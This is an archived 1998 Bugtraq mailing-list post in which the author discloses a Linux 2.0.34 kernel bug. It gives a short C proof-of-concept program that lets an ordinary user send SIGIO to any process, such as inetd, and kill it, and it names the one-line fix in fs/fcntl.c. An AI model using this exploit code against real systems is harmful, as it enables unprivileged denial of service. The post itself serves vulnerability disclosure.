=== Content from marc.info_79a94383_20250125_224120.html ===

```
[[prev in list](?l=bugtraq&m=90221103126046&w=2)] [[next in list](?l=bugtraq&m=90221103126048&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=90221104525830&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [Serious Linux 2.0.34 security problem](?t=90221121100009&r=1&w=2)
From:       [David Luyer <luyer () UCS ! UWA ! EDU ! AU>](?a=90366099100010&r=1&w=2)
Date:       [1998-06-30 7:10:47](?l=bugtraq&r=1&w=2&b=199806)
[Download RAW [message](?l=bugtraq&m=90221103126047&q=mbox) or [body](?l=bugtraq&m=90221103126047&q=raw)]

I just saw this mentioned on linux-kernel and confirmed it;

#include <fcntl.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
  int s, p;

  if(argc != 2) {
    fputs("Please specify a pid to send signal to.\n", stderr);
    exit(0);
  } else {
    p = atoi(argv[[1]](#1));
  }
  fcntl(0,F_SETOWN,p);
  s = fcntl(0,F_GETFL,0);
  fcntl(0,F_SETFL,s|O_ASYNC);
  printf("Sending SIGIO - press enter.\n");
  getchar();
  fcntl(0,F_SETFL,s&~O_ASYNC);
  printf("SIGIO send attempted.\n");
  return 0;
}

This can kill from a normal user account the inetd process under Linux
2.0.34 by sending a SIGIO.  Very bad.

The fix is to invert !euid to euid in fs/fcntl.c:send_sigio(); line number
is approximately 139.

David.

[[prev in list](?l=bugtraq&m=90221103126046&w=2)] [[next in list](?l=bugtraq&m=90221103126048&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=90221104525830&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


